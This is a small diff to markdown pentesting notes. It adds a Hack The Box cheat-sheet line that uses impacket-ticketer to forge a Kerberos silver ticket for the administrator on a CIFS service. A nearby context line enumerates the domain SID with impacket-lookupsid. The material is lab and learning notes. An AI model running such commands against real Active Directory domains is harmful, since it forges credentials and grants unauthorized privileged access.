@@ -71,3 +71,11 @@ impacket-lookupsid domain.local/user:Password123!@<DC_IP>
 ```
 
 Or use the domain SID shown in BloodHound/domain enumeration.
+
+---
+
+# HTB Cheatsheet
+
+```
+impacket-ticketer -nthash <SERVICE_HASH> -domain-sid S-1-5-21-... -domain domain.htb -spn cifs/target.domain.htb administrator
+```
